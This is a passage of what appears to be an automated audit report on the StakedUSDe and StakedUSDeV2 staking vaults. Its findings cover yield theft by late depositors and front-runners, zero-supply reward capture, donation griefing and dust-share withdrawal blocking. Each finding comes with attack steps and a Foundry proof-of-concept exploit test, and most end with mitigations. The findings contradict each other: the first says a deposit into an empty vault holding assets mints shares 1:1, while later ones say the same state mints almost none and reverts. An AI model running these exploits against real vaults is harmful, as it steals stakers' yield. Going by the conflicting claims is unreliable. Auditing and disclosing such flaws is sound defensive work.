When the last shares are burned during an active reward vesting period, StakedUSDeV2 permits totalSupply to become zero while unvested USDe remains in the vault. After the 8 hour vesting period, totalAssets becomes positive while totalSupply is still zero. OpenZeppelin ERC4626 then treats the next depositor as the initial depositor and mints shares 1:1, ignoring the already-held assets. That depositor can immediately cooldown/redeem those shares for their deposit plus all leftover vested rewards. Vulnerable flow: cooldownShares burns the caller's shares via _withdraw, and _checkMinShares only reverts when totalSupply > 0 && totalSupply < MIN_SHARES, so totalSupply == 0 is allowed even while the vault still holds unvested rewards. totalAssets later returns IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount(), making the leftover rewards redeemable by the first new depositor.

## Impact
Theft of unclaimed yield. A permissionless first depositor after a zero-supply vesting state can extract the entire leftover reward distribution without remaining staked during the vesting interval.

## Proof of Concept
1. Attacker is the only current staker, or waits for a state where they control all shares. 2. Rewarder performs a normal transferInRewards distribution while the attacker is staked. 3. Attacker immediately calls cooldownShares for all shares, burning totalSupply to zero and leaving the unvested rewards in the vault. 4. After rewards vest, totalAssets is positive while totalSupply is zero. 5. Attacker deposits MIN_SHARES and receives shares 1:1 as if no assets existed. 6. Attacker calls cooldownShares again and receives their deposit plus all vested rewards into the silo, then unstakes after cooldown.

## Proof of Code
pragma solidity 0.8.20;
import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {StakedUSDeV2} from "../contracts/contracts/StakedUSDeV2.sol";

contract MockUSDe is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeV2ZeroSupplyRewardPoC is Test {
    MockUSDe usde;
    StakedUSDeV2 vault;
    address admin = address(0xA11CE);
    address rewarder = address(0xB0B);
    address attacker = address(0xE0A);

    function setUp() public {
        usde = new MockUSDe();
        vault = new StakedUSDeV2(IERC20(address(usde)), rewarder, admin);
    }

    function testFirstDepositorAfterZeroSupplyStealsVestedRewards() public {
        usde.mint(attacker, 2 ether);
        usde.mint(rewarder, 100 ether);

        vm.startPrank(attacker);
        usde.approve(address(vault), type(uint256).max);
        uint256 initialShares = vault.deposit(1 ether, attacker);
        assertEq(initialShares, 1 ether);
        vm.stopPrank();

        vm.startPrank(rewarder);
        usde.approve(address(vault), 100 ether);
        vault.transferInRewards(100 ether);
        vm.stopPrank();

        vm.prank(attacker);
        vault.cooldownShares(initialShares);
        assertEq(vault.totalSupply(), 0);
        assertEq(usde.balanceOf(address(vault)), 100 ether);

        vm.warp(block.timestamp + 8 hours + 1);
        assertEq(vault.totalAssets(), 100 ether);

        vm.startPrank(attacker);
        uint256 newShares = vault.deposit(1 ether, attacker);
        assertEq(newShares, 1 ether);
        uint256 capturedAssets = vault.cooldownShares(newShares);
        assertEq(capturedAssets, 101 ether);
        vm.warp(block.timestamp + 91 days);
        vault.unstake(attacker);
        vm.stopPrank();

        assertEq(usde.balanceOf(attacker), 102 ether);
    }
}

## Suggested Mitigation
Do not allow the last share burn while the vault holds unvested or vested assets, or permanently lock/burn a minimum share supply so totalSupply cannot return to zero while assets remain. Alternatively override ERC4626 conversion logic to revert deposits when totalSupply == 0 and totalAssets() > 0 until governance explicitly sweeps or reinitializes the vault.
```

### H-8 / `jzQSoBIDdLn6j4JuheKLN`
- Finding title: Late depositors can capture already-funded unvested rewards in StakedUSDe
- Report lines: 898-1008
```md
## [H-8]. Late depositors can capture already-funded unvested rewards in StakedUSDe

## id: jzQSoBIDdLn6j4JuheKLN

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
AccountingInvariantViolation

## Location
StakedUSDe.deposit

## Finding Status: Valid
### Finding Status Justification: The described path exists in in-scope production code. StakedUSDe.transferInRewards() records vesting state and transfers USDe rewards, while totalAssets() subtracts getUnvestedAmount(). Deposits remain permissionless during active vesting and ERC4626 share minting uses totalAssets(), so a depositor entering after reward funding can mint shares at a price excluding the unvested reward. When vesting completes, getUnvestedAmount() becomes zero and the previously excluded assets are included in totalAssets() for all shares. There is no eligible-share snapshot, rewardDebt accounting, deposit pause during vesting, or other complete safeguard. The behavior is not explicitly documented as an accepted risk. Exploitation uses normal public deposit/redeem around a normal reward distribution and does not require a privileged or compromised actor, victim mistake, or future code changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Rewards are added to the vault and excluded from totalAssets() while they vest, but deposits remain open and no snapshot is taken of the share supply that existed when rewards were funded. A user who deposits after transferInRewards() mints shares at the pre-reward price because totalAssets() subtracts getUnvestedAmount(). When the vesting period ends, the previously funded rewards become part of totalAssets() and are distributed pro-rata to all current shares, including the late depositor's newly minted shares. This dilutes the stakers who were present when the reward was funded and transfers part of their unclaimed yield to the late depositor.

Vulnerable snippet:
function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
  _updateVestingAmount(amount);
  IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);
}

function totalAssets() public view override returns (uint256) {
  return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
}

function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override nonReentrant notZero(assets) notZero(shares) {
  ...
  super._deposit(caller, receiver, assets, shares);
}

## Impact
Theft of unclaimed yield. An attacker can deposit a large USDe amount immediately before or after a normal reward funding transaction, wait for the 8 hour vesting period, and withdraw their principal plus a share of rewards that were already funded for prior stakers. Existing stakers receive less yield than intended.

## Proof of Concept
1. Alice is the only staker with 100 USDe deposited, owning 100% of shares.
2. The rewarder funds 100 USDe of rewards through transferInRewards(). The vault holds the reward, but totalAssets() still reports only the pre-reward assets because the reward is unvested.
3. The attacker permissionlessly deposits 900 USDe during the vesting period and receives 900 shares at the pre-reward price.
4. After 8 hours, the 100 USDe reward is fully vested and totalAssets() includes it.
5. The attacker redeems 900 shares for 990 USDe, extracting 90 USDe of the reward. Alice receives only 110 USDe instead of the 200 USDe she would have received if rewards were snapshotted to stakers present at funding time.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/contracts/StakedUSDe.sol";

contract MockUSDe is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeLateJoinerPoC is Test {
    MockUSDe usde;
    StakedUSDe vault;

    address admin = address(0xA11CE);
    address rewarder = address(0xB0B);
    address alice = address(0xCAFE);
    address attacker = address(0xBAD);

    function setUp() public {
        usde = new MockUSDe();
        vault = new StakedUSDe(IERC20(address(usde)), rewarder, admin);

        usde.mint(alice, 100 ether);
        usde.mint(attacker, 900 ether);
        usde.mint(rewarder, 100 ether);

        vm.prank(alice);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(rewarder);
        usde.approve(address(vault), type(uint256).max);
    }

    function testLateJoinerCapturesAlreadyFundedUnvestedRewards() public {
        vm.prank(alice);
        vault.deposit(100 ether, alice);

        vm.prank(rewarder);
        vault.transferInRewards(100 ether);

        vm.prank(attacker);
        vault.deposit(900 ether, attacker);

        vm.warp(block.timestamp + 8 hours);

        uint256 aliceAssets = vault.previewRedeem(vault.balanceOf(alice));
        uint256 attackerAssets = vault.previewRedeem(vault.balanceOf(attacker));

        assertEq(aliceAssets, 110 ether);
        assertEq(attackerAssets, 990 ether);
        assertGt(attackerAssets, 900 ether);
        assertLt(aliceAssets, 200 ether);
    }
}

## Suggested Mitigation
Snapshot reward entitlement at funding time instead of letting future deposits share already-funded rewards. For example, maintain a rewardPerShare accumulator with userRewardPerSharePaid/rewardDebt accounting, or mint late depositors shares against total assets including a pending-reward liability so they cannot claim rewards funded before their deposit. Alternatively, block deposits during active vesting or route new deposits into a separate accounting epoch until the current vesting period completes.
```

### H-9 / `1TR_tQ8nm7i1y2XiB8tDO`
- Finding title: Late stakers can front-run StakedUSDe.transferInRewards to capture unclaimed yield from existing stakers
- Report lines: 1009-1118
```md
## [H-9]. Late stakers can front-run StakedUSDe.transferInRewards to capture unclaimed yield from existing stakers

## id: 1TR_tQ8nm7i1y2XiB8tDO

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
AccountingInvariantViolation

## Location
StakedUSDe.transferInRewards/_deposit

## Finding Status: Valid
### Finding Status Justification: The root cause exists: StakedUSDe has no snapshot or per-user reward accounting around transferInRewards(), and totalAssets() excludes unvested rewards until the vesting period elapses. A user can deposit before a visible reward transaction or during the unvested period, receive ERC4626 shares priced without the pending reward, and later redeem those shares after the reward becomes vested and included in totalAssets(). The available safeguards do not fully block this path: nonReentrant only prevents reentrant execution, _updateVestingAmount() prevents overlapping vesting, and _checkMinShares() is unrelated. The affected code is in the in-scope StakedUSDe contract. The exact reward capture by late/front-running stakers is not explicitly documented as intended behavior. The attacker only needs permissionless deposit/redeem access and ordinary reward funding by the rewarder, not privileged abuse, user error, or speculative future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
StakedUSDe distributes a fixed reward transfer by increasing the ERC4626 share price over the next 8 hours, but it does not snapshot the staker set or track per-user reward debt. A user can deposit immediately before a visible rewarder transaction, or during the unvested period, and receive shares priced only against currently vested assets. When the queued reward vests, the late shares participate pro-rata in that reward even though they were not staked during the period that generated the yield.

Vulnerable flow:
```solidity
function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
  _updateVestingAmount(amount);
  IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);
}

function totalAssets() public view override returns (uint256) {
  return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
}
```
Because deposits use ERC4626 pricing from `totalAssets()`, unvested rewards are excluded from the deposit price but later become withdrawable by all shares, including newly minted attacker shares.

## Impact
The attacker can siphon a proportional share of unclaimed staking yield from existing stakers. With sufficient capital deposited around reward funding events, the attacker can capture most of a reward distribution and withdraw principal plus stolen yield after vesting. Under the Ethena Immunefi rubric this maps to theft of unclaimed yield.

## Proof of Concept
1. Alice is the only long-term staker with 100 USDe deposited.
2. The rewarder is about to call `transferInRewards(100e18)`.
3. The attacker front-runs by depositing 900 USDe, receiving 900 sUSDe at the pre-reward share price.
4. The rewarder transaction transfers 100 USDe into vesting.
5. After 8 hours, the attacker redeems 900 sUSDe for 990 USDe, profiting 90 USDe.
6. Alice receives only 110 USDe instead of the 200 USDe she would have received as the sole staker.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../contracts/contracts/StakedUSDe.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDe is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeLateJoinerPoC is Test {
    MockUSDe usde;
    StakedUSDe vault;
    address alice = address(0xA11CE);
    address attacker = address(0xBEEF);
    address rewarder = address(0xCAFE);
    address admin = address(0xAD);

    function setUp() public {
        usde = new MockUSDe();
        vault = new StakedUSDe(IERC20(address(usde)), rewarder, admin);
        usde.mint(alice, 100 ether);
        usde.mint(attacker, 900 ether);
        usde.mint(rewarder, 100 ether);
        vm.prank(alice);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(rewarder);
        usde.approve(address(vault), type(uint256).max);
    }

    function testLateJoinerCapturesExistingStakerReward() public {
        vm.prank(alice);
        vault.deposit(100 ether, alice);

        vm.prank(attacker);
        vault.deposit(900 ether, attacker);

        vm.prank(rewarder);
        vault.transferInRewards(100 ether);

        vm.warp(block.timestamp + 8 hours);

        vm.prank(attacker);
        vault.redeem(vault.balanceOf(attacker), attacker, attacker);

        vm.prank(alice);
        vault.redeem(vault.balanceOf(alice), alice, alice);

        assertEq(usde.balanceOf(attacker), 990 ether);
        assertGt(usde.balanceOf(attacker), 900 ether);
        assertEq(usde.balanceOf(alice), 110 ether);
        assertLt(usde.balanceOf(alice), 200 ether);
    }
}


## Suggested Mitigation
Snapshot reward eligibility when rewards are funded, or track per-user reward debt/user index so only shares present during the relevant accrual interval receive that distribution. Alternatively, enforce a minimum staking age or cooldown before newly minted shares participate in pending/unvested rewards.
```

### M-10 / `Rxt5N1widPYf1llRNMoqZ`
- Finding title: Direct USDe donation to an empty StakedUSDeV2 can brick future deposits through MIN_SHARES
- Report lines: 1119-1198
```md
## [M-10]. Direct USDe donation to an empty StakedUSDeV2 can brick future deposits through MIN_SHARES

## id: Rxt5N1widPYf1llRNMoqZ

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
StakedUSDeV2.deposit

## Finding Status: Valid
### Finding Status Justification: The relevant production code exists in StakedUSDeV2/StakedUSDe. StakedUSDe.totalAssets() uses the vault's raw USDe balance minus unvested rewards, so direct USDe transfers to the vault are counted as assets without minting shares. StakedUSDe._deposit() calls _checkMinShares() after minting, and _checkMinShares() reverts whenever totalSupply is nonzero but below MIN_SHARES. rescueTokens() explicitly rejects token == asset(), so unsolicited USDe cannot be removed through that path. With OpenZeppelin ERC4626 share conversion, an empty vault with donated assets prices the next deposit against existing totalAssets, so a practical deposit can mint fewer than MIN_SHARES and revert. The path is permissionless via ERC20 transfer plus public deposit. The only caveat is the zero-supply precondition, but that is not impossible: it can occur before initial seeding or after all shares are withdrawn/burned. No complete safeguard is present, and the exact risk is not documented as accepted design.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
StakedUSDeV2 inherits ERC4626 deposits from StakedUSDe, where totalAssets() is based on the raw USDe balance and _deposit() enforces a global minimum share supply. Vulnerable snippets: `function totalAssets() public view override returns (uint256) { return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount(); }` and `_checkMinShares(): if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();`. Because direct USDe transfers are counted as assets even when totalSupply is zero, an attacker can donate USDe to an empty vault. The next depositor mints shares equal to roughly `assets / donatedAssets`; for any practical deposit after even a 1 USDe donation, minted shares are far below MIN_SHARES, so _checkMinShares reverts. rescueTokens() cannot remove USDe because it rejects `token == asset()`, leaving no recovery path except an economically infeasible first deposit large enough to mint at least 1e18 shares.

## Impact
Permissionless griefing can make staking unable to operate after the vault reaches zero supply, or before initial seeding, by forcing all practical deposits to revert. This maps to Medium impact as smart-contract liveness failure/griefing; no attacker profit is required.

## Proof of Concept
1. Wait until StakedUSDeV2 totalSupply is zero, or execute before the vault is initially seeded. 2. Transfer 1 USDe directly to the StakedUSDeV2 address without calling deposit(). 3. A victim attempts to deposit even a very large normal amount of USDe. 4. ERC4626 share conversion mints far fewer than MIN_SHARES shares because totalSupply is zero while totalAssets is nonzero. 5. _checkMinShares() reverts with MinSharesViolation, so deposits remain unusable while the donated USDe cannot be rescued.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/contracts/StakedUSDeV2.sol";
import "../contracts/contracts/interfaces/IStakedUSDe.sol";

contract MockUSDe is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract EmptyVaultDonationDoSTest is Test {
    MockUSDe usde;
    StakedUSDeV2 vault;
    address rewarder = address(0x1000);
    address owner = address(0x2000);
    address attacker = address(0x3000);
    address victim = address(0x4000);

    function setUp() public {
        usde = new MockUSDe();
        vault = new StakedUSDeV2(IERC20(address(usde)), rewarder, owner);
    }

    function test_DirectDonationToEmptyVaultBricksPracticalDeposits() public {
        assertEq(vault.totalSupply(), 0);

        usde.mint(attacker, 1 ether);
        vm.prank(attacker);
        usde.transfer(address(vault), 1 ether);

        assertEq(vault.totalAssets(), 1 ether);
        assertLt(vault.previewDeposit(1_000_000 ether), 1 ether);

        usde.mint(victim, 1_000_000 ether);
        vm.startPrank(victim);
        usde.approve(address(vault), type(uint256).max);
        vm.expectRevert(IStakedUSDe.MinSharesViolation.selector);
        vault.deposit(1_000_000 ether, victim);
        vm.stopPrank();

        assertEq(vault.totalSupply(), 0);
    }
}

## Suggested Mitigation
Seed and permanently lock at least MIN_SHARES during deployment, prevent totalSupply from returning to zero, or add a recovery path that skims unsolicited USDe when totalSupply is zero. Alternatively, account for unsolicited assets separately so direct transfers cannot set the initial ERC4626 share price.
```

### H-11 / `Ta6V-f3SZ4ShmDQ9e51Ko`
- Finding title: Late deposits during reward vesting steal unclaimed yield from existing StakedUSDe holders
- Report lines: 1199-1289
```md
## [H-11]. Late deposits during reward vesting steal unclaimed yield from existing StakedUSDe holders

## id: Ta6V-f3SZ4ShmDQ9e51Ko

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
AccountingInvariantViolation

## Location
StakedUSDe.transferInRewards

## Finding Status: Valid
### Finding Status Justification: The finding matches the supplied StakedUSDe code. transferInRewards() calls _updateVestingAmount() and then pulls reward assets, while totalAssets() returns the contract asset balance minus getUnvestedAmount(). During the 8 hour vesting window, new deposits are not blocked and are priced against totalAssets() that excludes the unvested reward. Once the vesting period ends, those assets become part of totalAssets() and are shared pro rata by all outstanding shares, including shares minted after funding. No code shown implements a distribution-time supply snapshot, per-user reward index, or reward debt, and _updateVestingAmount() only prevents overlapping reward distributions. This is in the scoped StakedUSDe.sol production contract, is not documented as an accepted intentional risk, and can be executed by an unprivileged depositor using normal vault functions after a legitimate reward funding event.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
StakedUSDe starts each reward distribution by recording only global vesting state and does not snapshot the shares that were present when the reward was funded. New deposits remain open while `vestingAmount` is still unvested. Because `totalAssets()` subtracts the unvested reward, late depositors mint shares at the pre-reward exchange rate, then receive a pro-rata share of the reward as it vests. Vulnerable snippet: `function transferInRewards(uint256 amount) external ... { _updateVestingAmount(amount); IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount); }` and `function totalAssets() public view override returns (uint256) { return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount(); }`. There is no `rewardDebt`, `userRewardPerTokenPaid`, or distribution-time eligible-share snapshot, so a large depositor can enter immediately after `RewardsReceived` and dilute the yield that was transferred for existing stakers.

## Impact
Theft of unclaimed yield. In the PoC, Alice is the only staker when 100 USDe of rewards is funded, but an attacker deposits 900 USDe during vesting and exits with about 990 USDe, capturing about 90 USDe of the reward that Alice would otherwise have received.

## Proof of Concept
1. Alice deposits 100 USDe and receives the initial sUSDe shares. 2. The rewarder calls `transferInRewards(100e18)`, making 100 USDe vest over 8 hours. 3. Before the reward finishes vesting, the attacker deposits 900 USDe. Since `totalAssets()` excludes the unvested reward, the attacker mints shares at the old price. 4. After 8 hours, the attacker redeems their shares. 5. The attacker receives materially more than their 900 USDe deposit, while Alice's redeemable value is reduced from roughly 200 USDe to roughly 110 USDe.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../contracts/StakedUSDe.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDe is ERC20 {
  constructor() ERC20("USDe", "USDe") {}
  function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeLateJoinerPoC is Test {
  MockUSDe internal usde;
  StakedUSDe internal vault;
  address internal owner = address(0xA11CE);
  address internal rewarder = address(0xB0B);
  address internal alice = address(0xA);
  address internal attacker = address(0xB);

  function setUp() public {
    usde = new MockUSDe();
    vault = new StakedUSDe(IERC20(address(usde)), rewarder, owner);
  }

  function _depositFor(address user, uint256 amount) internal {
    usde.mint(user, amount);
    vm.startPrank(user);
    usde.approve(address(vault), amount);
    vault.deposit(amount, user);
    vm.stopPrank();
  }

  function _sendReward(uint256 amount) internal {
    usde.mint(rewarder, amount);
    vm.startPrank(rewarder);
    usde.approve(address(vault), amount);
    vault.transferInRewards(amount);
    vm.stopPrank();
  }

  function testLateJoinerCapturesUnvestedReward() public {
    _depositFor(alice, 100 ether);
    _sendReward(100 ether);

    _depositFor(attacker, 900 ether);
    skip(8 hours);

    vm.prank(attacker);
    vault.redeem(vault.balanceOf(attacker), attacker, attacker);

    assertGt(usde.balanceOf(attacker), 989 ether);
    assertGt(usde.balanceOf(attacker), 900 ether);
    assertLt(vault.previewRedeem(vault.balanceOf(alice)), 111 ether);
  }
}

## Suggested Mitigation
Snapshot eligible shares when rewards are funded and stream that reward only to addresses holding shares at the snapshot, or implement standard reward-index accounting with `userRewardPerTokenPaid`/`rewardDebt` so deposits made after a distribution cannot claim prior unvested rewards. Alternatively, block deposits during an active vesting period, though that is less composable.
```

### M-12 / `7DRdpVApA8wuFLR28wQOR`
- Finding title: Dust share holder can block final withdrawals via StakedUSDe._checkMinShares
- Report lines: 1290-1374
```md
## [M-12]. Dust share holder can block final withdrawals via StakedUSDe._checkMinShares

## id: 7DRdpVApA8wuFLR28wQOR

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
StakedUSDe._withdraw

## Finding Status: Valid
### Finding Status Justification: The described withdrawal-blocking path exists. StakedUSDe._withdraw() calls super._withdraw() and then _checkMinShares(). _checkMinShares() reverts whenever totalSupply() is nonzero but below MIN_SHARES. Since deposits are permissionless and a dust holder can hold a tiny share balance while total supply is otherwise above MIN_SHARES, a large holder redeeming all of their shares can cause the post-withdraw supply to become the dust amount, triggering MinSharesViolation() and reverting the whole withdrawal. This is in scoped production StakedUSDe code. The min-share check is an anti-donation safeguard, but it does not fully prevent the claimed griefing path and is itself the mechanism causing it. The exact dust-holder blocking risk is not explicitly accepted in docs. No privileged role, compromised key, victim mistake, or future change is required; the attacker uses ordinary share ownership and the victim uses normal redeem/withdraw.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`StakedUSDe` enforces a global minimum non-zero total share supply after every deposit and withdrawal. Because any user can cheaply create or hold a 1 wei sUSDe balance, a dust holder can make the last meaningful holder unable to fully redeem: burning the victim's shares would leave `totalSupply()` below `MIN_SHARES`, so `_checkMinShares()` reverts after the inherited ERC4626 withdrawal path. Vulnerable snippet: `function _withdraw(...) internal override nonReentrant notZero(assets) notZero(shares) { ... super._withdraw(caller, receiver, _owner, assets, shares); _checkMinShares(); }` and `function _checkMinShares() internal view { uint256 _totalSupply = totalSupply(); if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation(); }`. The attacker does not need a privileged role; they only need to deposit or acquire dust shares while total supply is at least `MIN_SHARES`. When the vault later has one large holder plus the attacker dust, the large holder's full redeem is blocked until the dust holder cooperates, an admin intervenes, or another user accepts becoming the trapped residual holder.

## Impact
Permissionless griefing can temporarily freeze a user's redeemable USDe principal in near-empty or wind-down states. The attacker cost can be 1 wei of USDe/sUSDe while blocking the final meaningful holder from exiting.

## Proof of Concept
1. Alice initializes the vault by depositing exactly `MIN_SHARES` worth of USDe, receiving `1 ether` sUSDe. 2. The attacker deposits 1 wei USDe and receives 1 wei sUSDe, making total supply `MIN_SHARES + 1`. 3. Alice attempts to redeem all `1 ether` shares. 4. The inherited ERC4626 withdrawal would leave total supply at 1 wei, so `_checkMinShares()` reverts with `MinSharesViolation()`. 5. Alice cannot fully exit while the attacker keeps the dust share outstanding.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../contracts/contracts/StakedUSDe.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDe is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeMinSharesGriefTest is Test {
    MockUSDe usde;
    StakedUSDe vault;

    address admin = address(0xA11CE);
    address rewarder = address(0xB0B);
    address alice = address(0x100);
    address attacker = address(0x200);

    function setUp() public {
        usde = new MockUSDe();
        vault = new StakedUSDe(IERC20(address(usde)), rewarder, admin);
        usde.mint(alice, 1 ether);
        usde.mint(attacker, 1);
    }

    function testDustShareHolderBlocksFinalRedeem() public {
        vm.startPrank(alice);
        usde.approve(address(vault), type(uint256).max);
        vault.deposit(1 ether, alice);
        vm.stopPrank();

        vm.startPrank(attacker);
        usde.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        vm.stopPrank();

        assertEq(vault.totalSupply(), 1 ether + 1);
        assertEq(vault.balanceOf(attacker), 1);

        vm.prank(alice);
        vm.expectRevert(bytes4(keccak256("MinSharesViolation()")));
        vault.redeem(1 ether, alice, alice);

        assertEq(vault.balanceOf(alice), 1 ether);
        assertEq(usde.balanceOf(alice), 0);
    }
}


## Suggested Mitigation
Do not make ordinary withdrawals depend on a global minimum non-zero total supply that can be weaponized by dust holders. Prefer permanently locked seed shares or OpenZeppelin ERC4626 virtual-share inflation protection, remove `_checkMinShares()` from withdrawals, or add an explicit wind-down path that lets the final meaningful holder exit without requiring cooperation from unrelated dust holders.
```

### H-13 / `U8Fri0BIaSpSUs_mC_jiU`
- Finding title: Last staker can redeem during vesting and brick StakedUSDe deposits with unclaimable rewards stranded
- Report lines: 1375-1475
```md
## [H-13]. Last staker can redeem during vesting and brick StakedUSDe deposits with unclaimable rewards stranded

## id: U8Fri0BIaSpSUs_mC_jiU

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch - empty-supply vault with nonzero assets makes share conversion unusable

## Exploit Type
ERC4626SharePrice

## Location
StakedUSDe._withdraw

## Finding Status: Valid
### Finding Status Justification: The supplied code allows totalSupply() to become zero because _checkMinShares() only reverts when totalSupply() is greater than zero and below MIN_SHARES. During active vesting, totalAssets() excludes getUnvestedAmount(), so the final staker can redeem the currently vested assets while unvested USDe remains in the contract. After vesting completes, the vault can have zero shares and a positive asset balance. Under the stated OpenZeppelin ERC4626 v4.9.5 conversion behavior, first deposits are then priced against the stranded assets and can mint zero or fewer than MIN_SHARES shares, causing notZero(shares) or _checkMinShares() reverts. rescueTokens() explicitly rejects the asset token, so the stranded USDe is not recoverable through that admin function. This is in-scope StakedUSDe code, not explicitly documented as intended, and can occur through permissionless redeem behavior around ordinary reward vesting without privileged compromise, user misuse, or future assumptions.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`_withdraw` allows the final share holder to burn the entire supply even while unvested rewards remain in the vault. `_checkMinShares()` only rejects supplies between 1 and `MIN_SHARES`, so `totalSupply() == 0` is allowed. During reward vesting, `totalAssets()` subtracts `getUnvestedAmount()`, letting the last staker redeem all currently vested assets while leaving the unvested USDe balance behind with zero shares outstanding. Vulnerable logic: `super._withdraw(caller, receiver, _owner, assets, shares); _checkMinShares();` and `_checkMinShares()` only reverts when `_totalSupply > 0 && _totalSupply < MIN_SHARES`. After vesting completes, the vault has `totalSupply() == 0` and `totalAssets() > 0`. OpenZeppelin ERC4626 v4.9 conversions then price the first shares against the stranded assets with only the virtual share, so a normal deposit mints zero shares or less than `MIN_SHARES` and reverts. Since `rescueTokens()` forbids rescuing `asset()`, the stranded USDe rewards cannot be recovered by the contract.

## Impact
Permanent freezing of unclaimed yield left in the vault and functional DoS of future staking deposits unless an economically impossible amount of USDe is supplied to reseed the vault.

## Proof of Concept
1. The attacker is the only staker and deposits `MIN_SHARES` worth of USDe.
2. The normal rewarder transfers rewards into the vault, starting the 8 hour vesting period.
3. Before rewards vest, the attacker redeems all shares. Because `totalAssets()` excludes unvested rewards, the redeem succeeds and leaves the unvested reward balance in the vault with `totalSupply() == 0`.
4. After the vesting period, the stranded reward balance becomes `totalAssets()` but no shares exist.
5. New users' normal deposits mint zero or fewer than `MIN_SHARES` shares and revert, while `rescueTokens(asset())` is explicitly blocked.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {StakedUSDe} from "../contracts/StakedUSDe.sol";
import {IStakedUSDe} from "../contracts/interfaces/IStakedUSDe.sol";

contract MockUSDe is ERC20 {
  constructor() ERC20("USDe", "USDe") {}
  function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeZeroSupplyVestingPoC is Test {
  MockUSDe usde;
  StakedUSDe vault;
  address attacker = address(0xA11CE);
  address rewarder = address(0xB0B);
  address admin = address(0xAD);
  address user = address(0xCAFE);

  function setUp() public {
    usde = new MockUSDe();
    vault = new StakedUSDe(IERC20(address(usde)), rewarder, admin);
  }

  function testLastRedeemerLeavesUnvestedRewardsAndBricksVault() public {
    usde.mint(attacker, 1 ether);
    vm.startPrank(attacker);
    usde.approve(address(vault), type(uint256).max);
    vault.deposit(1 ether, attacker);
    vm.stopPrank();

    usde.mint(rewarder, 100 ether);
    vm.startPrank(rewarder);
    usde.approve(address(vault), 100 ether);
    vault.transferInRewards(100 ether);
    vm.stopPrank();

    vm.prank(attacker);
    vault.redeem(1 ether, attacker, attacker);
    assertEq(vault.totalSupply(), 0);
    assertEq(usde.balanceOf(address(vault)), 100 ether);

    vm.warp(block.timestamp + 8 hours + 1);
    assertEq(vault.totalAssets(), 100 ether);
    assertEq(vault.previewDeposit(100 ether), 0);
    assertGt(vault.previewMint(1 ether), 1_000_000_000 ether);

    usde.mint(user, 100 ether);
    vm.startPrank(user);
    usde.approve(address(vault), 100 ether);
    vm.expectRevert(IStakedUSDe.InvalidAmount.selector);
    vault.deposit(100 ether, user);
    vm.stopPrank();
  }
}


## Suggested Mitigation
